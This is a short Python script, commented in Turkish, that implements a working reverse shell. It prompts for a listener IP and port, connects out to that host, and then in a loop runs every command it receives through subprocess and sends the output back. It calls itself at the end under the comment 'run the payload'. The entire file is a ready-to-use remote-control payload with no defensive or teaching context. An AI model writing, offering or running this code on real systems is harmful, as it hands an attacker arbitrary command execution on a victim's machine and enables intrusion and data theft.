import socket
import subprocess

def reverse_shell():
    # Kullanıcıdan girişleri al
    host = input("Lütfen dinleyici IP adresini girin: ")
    port = int(input("Lütfen dinleyici port numarasını girin: "))

    # Bağlantıyı kur
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    print(f"{host}:{port} adresine bağlanıldı!")

    while True:
        # Komut al ve çalıştır
        command = s.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            print("Bağlantı sonlandırılıyor...")
            break
        output = subprocess.getoutput(command)
        s.send(output.encode('utf-8'))

    s.close()

# Payload'u çalıştır
reverse_shell()
